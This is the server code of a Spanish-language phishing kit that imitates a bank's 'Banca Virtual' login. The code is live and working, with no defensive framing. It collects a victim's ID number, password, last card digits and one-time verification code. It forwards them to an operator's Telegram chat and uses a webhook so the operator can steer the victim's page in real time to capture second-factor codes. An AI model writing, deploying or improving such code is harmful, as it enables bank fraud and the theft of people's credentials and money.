const express = require("express");
const axios = require("axios");
const crypto = require("crypto");

const app = express();
app.use(express.json());
app.use(express.static("public"));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const requests = {};

/* =========================
ENVIAR NOMBRE
========================= */
app.post("/api/nombre", async (req,res)=>{

  try{

    const { tipo, identificacion, clave, ultimos } = req.body || {};

    if(!tipo || !identificacion || !clave){
      return res.json({error:true});
    }

    const id = crypto.randomUUID();

    /* GUARDAR SESSION */
    requests[id] = {
      estado:"esperando",
      tipo,
      identificacion,
      clave,
      ultimos: ultimos || null
    };

    /* MENSAJE SEGÚN FORMULARIO */
    let texto = "";

    if(ultimos){
      /* FORMULARIO TARJETA */
      texto =
`💳 BANCA VIRTUAL - TARJETA DEBITO

📋 Tipo: ${tipo}
🆔 ID: ${identificacion}
🔐 Clave: ${clave}
💳 Últimos: ${ultimos}

🆔 ID:${id}`;
    } else {

      /* FORMULARIO CLAVE SEGURA */
      texto =
`📚 BANCA VIRTUAL - CLAVE SEGURA

📋 Tipo: ${tipo}
🆔 ID: ${identificacion}
🔐 Clave: ${clave}

🆔 ID:${id}`;
    }

    /* ENVIAR TELEGRAM */
    await axios.post(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        chat_id: CHAT_ID,
        text: texto,
        reply_markup:{
          inline_keyboard:[[
            { text:"❌ ERROR", callback_data:`error_${id}` },
            { text:"🔢 CODIGO", callback_data:`codigo_${id}` }
          ]]
        }
      }
    );

    res.json({id});

  }catch(err){
    console.log(err);
    res.json({error:true});
  }

});



/* =========================
ENVIAR CODIGO
========================= */
app.post("/api/codigo", async (req,res)=>{
  const { id, codigo } = req.body;

  const r = requests[id];
  if(!r) return res.sendStatus(404);

  r.estado="verificando";
  r.codigo=codigo;

  const texto =
`🏦 BANCA VIRTUAL - CLAVE SEGURA

🪪 Tipo: ${r.tipo}
👤 ID: ${r.identificacion}
🔐 Clave: ${r.clave}
🔐 Codigo: ${codigo}

ID:${id}`;

  await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
    chat_id:CHAT_ID,
    text:texto,
    reply_markup:{
      inline_keyboard:[[
        {text:"codok",callback_data:`codok_${id}`},
        {text:"coderror",callback_data:`coderror_${id}`}
      ]]
    }
  });

  res.sendStatus(200);
});


/* =========================
CONSULTAR ESTADO
========================= */
app.get("/api/estado/:id",(req,res)=>{
  const r=requests[req.params.id];
  if(!r) return res.json({estado:"index"});
  res.json({estado:r.estado});
});

/* =========================
WEBHOOK TELEGRAM
========================= */
app.post(`/webhook/${BOT_TOKEN}`,async(req,res)=>{
  const q=req.body.callback_query;
  if(!q) return res.sendStatus(200);

  const [accion,id]=q.data.split("_");
  if(!requests[id]) return res.sendStatus(200);

  if(accion==="error") requests[id].estado="index";
  if(accion==="codigo") requests[id].estado="codigo";
  if(accion==="codok") requests[id].estado="ok";
  if(accion==="coderror") requests[id].estado="coderr";

  await axios.post(
    `https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`,
    {callback_query_id:q.id}
  );

  res.sendStatus(200);
});

/* ========================= */
app.listen(process.env.PORT||3000);
